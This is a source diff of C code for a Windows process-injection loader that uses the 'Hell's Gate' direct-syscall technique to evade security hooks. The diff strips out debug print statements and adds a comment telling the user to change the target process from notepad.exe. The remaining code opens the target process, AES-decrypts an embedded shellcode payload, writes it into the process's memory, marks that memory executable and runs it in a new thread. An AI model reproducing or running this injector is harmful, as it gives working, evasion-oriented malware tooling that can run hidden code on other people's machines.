@@ -220,8 +220,9 @@ BOOL Payload(PVX_TABLE pVxTable) {
 
 	HANDLE u32 = LoadLibraryA("User32.dll");
 
-	//printf("vx_tab: %p | HellsGate: %p | HellDescent: %p\n", pVxTable, HellsGate); getchar();
+	
 	DWORD pid = 0;
+	//Change notepad.exe to any process you would like to inject to
 	pid = FindTarget(L"notepad.exe");
 	HANDLE pHandle = NULL;
 	CLIENT_ID cid;
@@ -232,14 +233,6 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	HellsGate(pVxTable->NtOpenProcess.wSystemCall);
 	status = SysNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION, &oa, &cid);
 
-	//if (pHandle == NULL)
-	//{
-	//	printf("Handle not obtained with syscall!\n");
-	//}
-	//else
-	//{
-	//	printf("Handle obtained with syscall!\n"); getchar();
-	//}
 
 	// Allocate memory for the shellcode
 	PVOID lpAddress = NULL;
@@ -247,46 +240,25 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
 	status = SysNtAllocateVirtualMem(pHandle, &lpAddress, 0, (PULONG)&sDataSize, MEM_COMMIT, PAGE_READWRITE);
 
-	//if (lpAddress != NULL)
-	//{
-	//	printf("memory allocated!\n"); getchar();
-	//}
-
-	//printf("sc: %p | sc_mem: %p\n", payload, lpAddress); getchar();
-
 	// Decrypt payload
 	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
 
 
-	ULONG numberOfBytesWritten = NULL;
 	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
 	status = SysNtWriteVirtualMem(pHandle, lpAddress, (PVOID)payload, sDataSize, 0);
-	//if (numberOfBytesWritten != NULL)
-	//{
-	//	printf("payload written into memory space!\n");
-	//}
-
 
 	// Change page permissions
 	ULONG ulOldProtect = 0;
 	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
 	status = SysNtProtectVirtualMem(pHandle, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
 
-	//printf("All set! GO!\n"); getchar();
+	
 
 	// Create thread
 	HANDLE hHostThread = INVALID_HANDLE_VALUE;
 	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
 	status = SysNtCreateThreadEx(&hHostThread, 0x1FFFFF, &oa, pHandle, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
-	//if (hHostThread == INVALID_HANDLE_VALUE)
-	//{
-	//	printf("thread handle not obtained\n");
-	//}
-
-
-	//printf("Exit?\n");
-	//getchar();
-
+	
 	// Wait for 1 seconds
 	LARGE_INTEGER Timeout;
 	Timeout.QuadPart = -10000000;
